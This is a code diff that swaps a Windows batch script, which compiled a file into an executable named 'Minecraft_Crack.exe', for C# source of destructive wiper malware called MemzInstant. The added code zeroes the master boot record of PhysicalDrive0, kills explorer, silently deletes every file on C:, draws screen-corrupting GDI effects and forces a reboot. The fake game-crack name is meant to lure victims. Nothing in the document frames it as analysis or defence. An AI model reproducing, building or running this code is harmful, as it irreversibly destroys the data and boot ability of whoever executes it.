@@ -1,49 +1,69 @@
-@echo off
-color 0b
-echo ========================================
-echo   MINECRAFT ASSET BUILDER (DEBUG)
-echo ========================================
-echo.
+using System;
+using System.Drawing;
+using System.Windows.Forms;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Threading;
 
-:: Sprawdzenie czy plik Idiot.cs w ogole istnieje w tym folderze
-if not exist "Idiot.cs" (
-    echo [ERROR] I cannot find Idiot.cs in this folder!
-    echo Put Idiot.cs and this .bat file in the same folder.
-    pause
-    exit
-)
+namespace MemzInstant
+{
+    class Program
+    {
+        [DllImport("kernel32.dll")] static extern IntPtr CreateFile(string lp, uint da, uint sm, IntPtr sa, uint cd, uint fa, IntPtr h);
+        [DllImport("kernel32.dll")] static extern bool WriteFile(IntPtr h, byte[] b, uint n, out uint w, IntPtr o);
+        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcD, int x, int y, int w, int h, IntPtr hdcS, int xs, int ys, int r);
+        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);
 
-:: Reczne ustawienie sciezki do kompilatora (Najczestsza w Windows 7/10/11)
-set "CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+        static void Main()
+        {
+            // 1. NATYCHMIASTOWE NISZCZENIE MBR
+            OverwriteMBR();
 
-if not exist "%CSC%" (
-    echo [RETRY] 64-bit compiler not found, trying 32-bit...
-    set "CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
-)
+            // 2. USUNIĘCIE EXPLORERA I PLIKÓW (W TLE)
+            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f C:\\*.*") { WindowStyle = ProcessWindowStyle.Hidden });
 
-if not exist "%CSC%" (
-    echo [ERROR] .NET Framework 4.0/4.5 is NOT INSTALLED on this VM.
-    echo Please download and install .NET Framework 4.5.
-    pause
-    exit
-)
+            // 3. EFEKTY WIZUALNE (PAYLOADS) W OSOBNYCH WĄTKACH
+            Thread gdiThread = new Thread(GdiPayload);
+            gdiThread.Start();
 
-echo [SYSTEM] Compiling... please wait...
-echo.
+            // 4. WYMUSZONY RESTART PO 15 SEKUNDACH EFEKTÓW
+            Thread.Sleep(15000);
+            Process.Start("shutdown", "/r /f /t 0");
+        }
 
-:: Proba kompilacji
-"%CSC%" /target:winexe /r:System.Windows.Forms.dll /r:System.Drawing.dll /out:"Minecraft_Crack.exe" "Idiot.cs"
+        static void OverwriteMBR()
+        {
+            try
+            {
+                byte[] mbrData = new byte[512]; // Puste dane (czyści MBR)
+                uint written;
+                IntPtr drive = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
+                WriteFile(drive, mbrData, 512, out written, IntPtr.Zero);
+            }
+            catch { }
+        }
 
-if %errorlevel% equ 0 (
-    echo ========================================
-    echo   SUCCESS! Minecraft_Crack.exe created!
-    echo ========================================
-) else (
-    echo.
-    echo [ERROR] Something is wrong inside Idiot.cs code.
-    echo Check the error messages above.
-)
+        static void GdiPayload()
+        {
+            Random rnd = new Random();
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            int w = Screen.PrimaryScreen.Bounds.Width;
+            int h = Screen.PrimaryScreen.Bounds.Height;
 
-echo.
-echo Press any key to close this window...
-pause >nul
+            while (true)
+            {
+                // Efekt "Tunneling" i "Invert"
+                BitBlt(hdc, rnd.Next(-10, 10), rnd.Next(-10, 10), w, h, hdc, 0, 0, 0x00990066);
+                
+                // Losowe ikony błędów na ekranie
+                using (Graphics g = Graphics.FromHdc(hdc))
+                {
+                    g.DrawIcon(SystemIcons.Error, rnd.Next(w), rnd.Next(h));
+                    g.DrawIcon(SystemIcons.Warning, rnd.Next(w), rnd.Next(h));
+                }
+                
+                Thread.Sleep(10);
+            }
+        }
+    }
+}
